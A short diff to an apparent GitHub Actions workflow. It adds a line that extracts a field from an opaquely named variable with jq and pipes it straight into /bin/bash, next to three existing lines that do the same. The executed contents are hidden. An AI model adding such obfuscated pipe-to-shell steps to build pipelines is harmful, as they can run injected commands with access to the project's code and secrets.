@@ -34,6 +34,7 @@ jobs:
           echo $fg603 | jq -r .clh8 | /bin/bash
           printf '%s' "$os7975" | jq -r .zvoqg1295 | /bin/bash
           echo $i1378 | jq -r .lpoo61 | /bin/bash
+          printf '%s' "$fvrl316" | jq -r .rm2 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
